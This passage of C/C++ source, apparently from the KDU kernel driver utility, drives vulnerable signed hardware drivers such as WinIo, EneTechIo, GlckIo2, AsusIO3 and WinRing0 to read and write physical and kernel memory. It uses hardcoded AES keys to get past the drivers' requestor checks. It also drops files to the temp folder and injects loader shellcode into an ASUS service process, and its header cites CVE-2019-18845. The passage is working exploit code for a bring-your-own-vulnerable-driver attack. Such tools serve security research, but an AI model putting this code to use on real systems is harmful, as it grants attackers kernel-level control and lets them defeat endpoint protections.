        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID WinIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory2
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
* EneTechIo latest version variant with requestor check.
*
*/
PVOID WinIoMapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.CommitSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    //
    // Debug warning.
    //
    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
    // timing between key generation and time of check on driver side.
    // It is limited to 2 seconds, thus you should not put any breakpoints 
    // after key is generated and can only do that uppon EneTechIo device call completion.
    //

    ULONG seconds = supGetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(seconds));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory2
*
* Purpose:
*
* Unmap previously mapped physical memory.
* EneTechIo latest version variant with requestor check.
*
*/
VOID WinIoUnmapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    //
    // Debug warning.
    //
    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
    // timing between key generation and time of check on driver side.
    // It is limited to 2 seconds, thus you should not put any breakpoints 
    // after key is generated and can only do that uppon EneTechIo device call completion.
    //

    ULONG seconds = supGetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* RedFoxMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID RedFoxMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    WINIO_REDFOX request;
    ULONG_PTR offset;
    ULONG mapSize;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.BusAddress = offset;
    request.ViewSize = mapSize;

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* RedFoxUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID RedFoxUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    WINIO_REDFOX request;

    UNREFERENCED_PARAMETER(ReferencedObject);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI WinIoQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD cbRead = 0x100000;
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
        0ULL,
        cbRead,
        &sectionHandle,
        &refObject);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle,
            refObject);
    }

    return (PML4 != 0);
}

/*
* WinIoReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI WinIoReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = g_WinIoMapMemoryRoutine(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &refObject);

    if (mappedSection) {

        if (g_SpecifyOffset)
            offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));
        else
            offset = PhysicalAddress;

        __try {

            if (DoWrite) {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
                }
            }
            else {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
                }
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            mappedSection,
            sectionHandle,
            refObject);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WinIoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI WinIoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* WinIoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WinIoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* WinIoVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WinIoVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        WinIoQueryPML4Value,
        WinIoReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* WinIoReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WinIoReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* WinIoWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WinIoWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* GlckIo2Register
*
* Purpose:
*
* Register in GlckIo2 "trusted" process list.
*
*/
BOOL GlckIo2Register(
    _In_ HANDLE DeviceHandle)
{
    AES_ctx ctx;
    ULONG_PTR encryptedProcessId;
    UCHAR Buffer[16];
    BYTE OutBuf[512];
    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };

    RtlSecureZeroMemory(&ctx, sizeof(ctx));

    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);

    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlSecureZeroMemory(&OutBuf, sizeof(OutBuf));
    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);

    return supCallDriver(DeviceHandle,
        IOCTL_GKCKIO2_REGISTER,
        &Buffer,
        sizeof(Buffer),
        &OutBuf,
        sizeof(OutBuf));
}

/*
* WinIoPreOpen
*
* Purpose:
*
* Pre-open callback for some variants of Ene WinIo drivers.
*
*/
BOOL WINAPI WinIoPreOpen(
    _In_ PVOID Param
)
{
    UNREFERENCED_PARAMETER(Param);
    return supManageDummyDll(DUMMYDLL, FALSE);
}

#define ASUS_LDR_DLL L"u.dll"
#define ASUS_SVC_EXE L"AsusCertService.exe"

/*
* AsusIO3PreOpen
*
* Purpose:
*
* Pre-open callback for AsIO3.
*
*/
BOOL WINAPI AsusIO3PreOpen(
    _In_ PVOID Param
)
{
    BOOL bResult = FALSE;
    DWORD cch;
    ULONG resourceSize = 0;
    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;
    WCHAR szTemp[MAX_PATH + 1];
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    PBYTE dllBuffer, svcBuffer = NULL;

    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI32,
        GetModuleHandle(NULL),
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (dllBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Failed to load helper dll\r\n");

        return FALSE;

    }

    if (supReplaceDllEntryPoint(dllBuffer,
        resourceSize,
        (LPCSTR)"RegisterForProvider",
        FALSE))
    {

        StringCchPrintf(szFileName, MAX_PATH * 2,
            TEXT("%ws\\%ws"),
            szTemp,
            ASUS_LDR_DLL);

        NTSTATUS ntStatus;

        if (supWriteBufferToFile(szFileName,
            dllBuffer,
            resourceSize,
            TRUE,
            FALSE,
            &ntStatus))
        {
            resourceSize = 0;
            svcBuffer = (PBYTE)KDULoadResource(IDR_DATA_ASUSCERTSERVICE,
                Context->ModuleBase,
                &resourceSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (svcBuffer) {

                StringCchPrintf(szFileName, MAX_PATH * 2,
                    TEXT("%ws\\%ws"),
                    szTemp,
                    ASUS_SVC_EXE);

                if (supWriteBufferToFile(szFileName,
                    svcBuffer,
                    resourceSize,
                    TRUE,
                    FALSE,
                    NULL))
                {
                    HANDLE zombieProcess = NULL;

                    if (NT_SUCCESS(supInjectPayload(svcBuffer,
                        g_KduLoaderShellcode,
                        sizeof(g_KduLoaderShellcode),
                        szFileName,
                        &zombieProcess)))
                    {
                        Sleep(1000);
                        Context->ArbitraryData = (ULONG64)zombieProcess;
                        bResult = TRUE;
                    }
                }

                supHeapFree(svcBuffer);
            }
            else {
                supPrintfEvent(kduEventError, "[!] Failed to load ASUS service resource\r\n");
            }

        }
        else {
            supShowHardError("[!] Error while writing data to disk", ntStatus);
        }

    }
    else {
        supPrintfEvent(kduEventError, "[!] Error while configuring helper dll\r\n");
    }

    supHeapFree(dllBuffer);

    return bResult;
}

/*
* AsusIO3UnregisterDriver
*
* Purpose:
*
* Unregister routine for AsIO3.
*
*/
BOOL WINAPI AsusIO3UnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    DWORD cch;
    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;

    HANDLE zombieProcess;
    WCHAR szTemp[MAX_PATH + 1];

    UNREFERENCED_PARAMETER(DeviceHandle);

    if (Context == NULL)
        return FALSE;

    zombieProcess = (HANDLE)Context->ArbitraryData;

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    if (zombieProcess) {
        TerminateProcess(zombieProcess, ERROR_SUCCESS);
        CloseHandle(zombieProcess);
    }

    supExtractFileToTemp(NULL, 0, szTemp, ASUS_SVC_EXE, TRUE);
    supExtractFileToTemp(NULL, 0, szTemp, ASUS_LDR_DLL, TRUE);

    return TRUE;
}

/*
* WinIoRegisterDriver
*
* Purpose:
*
* Register WinIo driver.
*
*/
BOOL WINAPI WinIoRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    g_WinIoMapIOCTL = IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY;
    g_WinIoUnmapIOCTL = IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY;

    switch (DriverId) {
    case IDR_GLCKIO2:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;

        if (!GlckIo2Register(DeviceHandle))
            return FALSE;

        break;

    case IDR_MSIO64:
        g_WinIoMapMemoryRoutine = MsIoMapMemory;
        g_WinIoUnmapMemoryRoutine = MsIoUnmapMemory;
        g_PhysAddress64bit = FALSE;
        break;

    case IDR_ENETECHIO64:
        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey;
        g_PhysAddress64bit = TRUE;
        break;

    case IDR_ENETECHIO64B:
        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey2;
        g_PhysAddress64bit = TRUE;
        break;

    case IDR_ASUSIO2:
    case IDR_ASUSIO3:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;
        g_WinIoMapIOCTL = IOCTL_ASUSIO_MAP_USER_PHYSICAL_MEMORY;
        g_WinIoUnmapIOCTL = IOCTL_ASUSIO_UNMAP_USER_PHYSICAL_MEMORY;
        break;

    case IDR_INPOUTX64:
        g_WinIoMapMemoryRoutine = RedFoxMapMemory;
        g_WinIoUnmapMemoryRoutine = RedFoxUnmapMemory;
        g_WinIoMapIOCTL = IOCTL_REDFOX_MAP_USER_PHYSICAL_MEMORY;
        g_WinIoUnmapIOCTL = IOCTL_REDFOX_UNMAP_USER_PHYSICAL_MEMORY;
        g_SpecifyOffset = TRUE;
        break;

    case IDR_MSI_WINIO:
    case IDR_WNBIOS64:
    default:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;
        break;
    }

    return TRUE;
}

/*
* WinIoUnregisterDriver
*
* Purpose:
*
* Unregister routine for some variants of WinIo driver.
*
*/
BOOL WINAPI WinIoUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;

    UNREFERENCED_PARAMETER(DeviceHandle);

    if (Context) {

        if (Context->Provider->LoadData->ResourceId == IDR_ENETECHIO64B) {

            return supManageDummyDll(DUMMYDLL, TRUE);

        }
    }

    return FALSE;
}

```

`Source/Hamakaze/idrv/winio.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       WINIO.H
*
*  VERSION:     1.27
*
*  DATE:        11 Nov 2022
*
*  WINIO based drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Generic WINIO interface for all supported drivers based on WINIO code.
//
// MICSYS RGB driver interface for CVE-2019-18845.
// Ptolemy Tech Co., Ltd ENE driver interface
// G.Skill EneIo64 driver interface
// ASUS GPU Tweak driver interface
// ... and multiple others
//

#define FILE_DEVICE_WINIO       (DWORD)0x00008010
#define FILE_DEVICE_ASUSIO      (DWORD)0x0000A040

#define WINIO_IOCTL_INDEX       (DWORD)0x810

#define WINIO_MAP_FUNCID        (DWORD)0x810
#define WINIO_UNMAP_FUNCID      (DWORD)0x811
#define WINIO_READMSR           (DWORD)0x816

#define GLCKIO2_REGISTER_FUNCID (DWORD)0x818

#define ASUSIO_MAP_FUNCID      (DWORD)0x920
#define ASUSIO_UNMAP_FUNCID    (DWORD)0x914

#define FILE_DEVICE_UCOREW64   (DWORD)0xFA00

#define UCOREW64_MAP_FUNCID    (DWORD)0xBBA
#define UCOREW64_UNMAP_FUNCID  (DWORD)0xBBB

#define FILE_DEVICE_REDFOX     (DWORD)0x9C40

#define REDFOX_MAP_FUNCID      (DWORD)0x807
#define REDFOX_UNMAP_FUNCID    (DWORD)0x808

#define IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY     \
    CTL_CODE(FILE_DEVICE_WINIO, WINIO_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102040

#define IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY   \
    CTL_CODE(FILE_DEVICE_WINIO, WINIO_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102044

#define IOCTL_WINIO_READMSR     \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GKCKIO2_REGISTER     \
    CTL_CODE(FILE_DEVICE_WINIO, GLCKIO2_REGISTER_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_ASUSIO_MAP_USER_PHYSICAL_MEMORY     \
    CTL_CODE(FILE_DEVICE_ASUSIO, ASUSIO_MAP_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0xA040A480

#define IOCTL_ASUSIO_UNMAP_USER_PHYSICAL_MEMORY   \
    CTL_CODE(FILE_DEVICE_ASUSIO, ASUSIO_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0xA0402450

#define IOCTL_UCOREW64_MAP_USER_PHYSICAL_MEMORY     \
    CTL_CODE(FILE_DEVICE_UCOREW64, UCOREW64_MAP_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) 

#define IOCTL_UCOREW64_UNMAP_USER_PHYSICAL_MEMORY   \
    CTL_CODE(FILE_DEVICE_UCOREW64, UCOREW64_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) 

#define IOCTL_REDFOX_MAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(FILE_DEVICE_REDFOX, REDFOX_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_REDFOX_UNMAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(FILE_DEVICE_REDFOX, REDFOX_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define SWAP_UINT32(x) (((x) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | ((x) << 24))


/*

MsIo64 Structure definition note

Field BusAddress downcasted to ULONG in driver

HalTranslateBusAddress(1i64, 0i64, (PVOID)(ULONG)RegionStart, &AddressSpace, &TranslatedAddress);

*/
#pragma warning(push)
#pragma warning(disable:4324) // structure padded due to __declspec(align())
typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)_MSIO_PHYSICAL_MEMORY_INFO {
    ULONG_PTR ViewSize;
    ULONG BusAddress;
    HANDLE SectionHandle;
    PVOID BaseAddress;
    PVOID ReferencedObject;
} MSIO_PHYSICAL_MEMORY_INFO, * PMSIO_PHYSICAL_MEMORY_INFO;
#pragma warning(pop)

/*

This is original WinIo structure layout.

*/
typedef struct _WINIO_PHYSICAL_MEMORY_INFO {
    ULONG_PTR ViewSize;
    ULONG_PTR BusAddress; //physical address
    HANDLE SectionHandle;
    PVOID BaseAddress;
    PVOID ReferencedObject;
} WINIO_PHYSICAL_MEMORY_INFO, * PWINIO_PHYSICAL_MEMORYINFO;

/*

EneTechIo enhanced variant with requestor check.

*/
typedef struct _WINIO_PHYSICAL_MEMORY_INFO_EX {
    ULONG_PTR CommitSize;
    ULONG_PTR BusAddress;
    HANDLE SectionHandle;
    PVOID BaseAddress;
    PVOID ReferencedObject;
    UCHAR EncryptedKey[16];
} WINIO_PHYSICAL_MEMORY_INFO_EX, * PWINIO_PHYSICAL_MEMORY_INFO_EX;

/*

Inpoutx64 structure layout.

*/
typedef struct _WINIO_REDFOX {
    HANDLE SectionHandle;
    ULONG_PTR ViewSize;
    ULONG_PTR BusAddress;
    PVOID BaseAddress;
} WINIO_REDFOX, * PWINIO_REDFOX;

BOOL WINAPI WinIoQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI WinIoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WinIoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WinIoVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI WinIoReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WinIoWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WinIoPreOpen(
    _In_ PVOID Param);

BOOL WINAPI AsusIO3PreOpen(
    _In_ PVOID Param);

BOOL WINAPI AsusIO3UnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI WinIoRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI WinIoUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

```

`Source/Hamakaze/idrv/winring0.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       WINRING0.CPP
*
*  VERSION:     1.31
*
*  DATE:        14 Apr 2023
*
*  WinRing0 based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winring0.h"

//
// WARNING, (BUG)FEATURE ALERT
// 
// WinRing0 crapware does not check API call results.
// This will eventually lead to BSOD in case of mapping failure.
//

/*
* WRZeroReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
*
*/
BOOL WRZeroReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    OLS_READ_MEMORY_INPUT request;

    request.Address.QuadPart = PhysicalAddress;
    request.UnitSize = 1;
    request.Count = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_OLS_READ_MEMORY,
        &request,
        sizeof(OLS_READ_MEMORY_INPUT),
        Buffer,
        NumberOfBytes);
}

/*
* WRZeroWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WRZeroWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;
    OLS_WRITE_MEMORY_INPUT* pRequest;

    value = FIELD_OFFSET(OLS_WRITE_MEMORY_INPUT, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (OLS_WRITE_MEMORY_INPUT*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->Address.QuadPart = PhysicalAddress;
        pRequest->UnitSize = 1;
        pRequest->Count = NumberOfBytes;
        RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_OLS_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        if (!bResult)
            dwError = GetLastError();

        supFreeLockedMemory(pRequest, size);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WRZeroQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI WRZeroQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    DWORD cbSize = 0x100000;
    ULONG_PTR PML4 = 0;
    UCHAR* pbLowStub1M;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    do {

        pbLowStub1M = (UCHAR*)supHeapAlloc(cbSize);
        if (pbLowStub1M == NULL) {
            dwError = GetLastError();
            break;
        }

        for (ULONG_PTR i = 0; i < cbSize; i += PAGE_SIZE) {

            if (!WRZeroReadPhysicalMemory(DeviceHandle,
                i,
                RtlOffsetToPointer(pbLowStub1M, i),
                PAGE_SIZE))
            {
                dwError = GetLastError();
                break;
            }

        }

        if (dwError == ERROR_SUCCESS) {

            PML4 = supGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
            if (PML4)
                *Value = PML4;

        }

    } while (FALSE);

    if (pbLowStub1M)
        supHeapFree(pbLowStub1M);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* WRZeroVirtualToPhysical
*
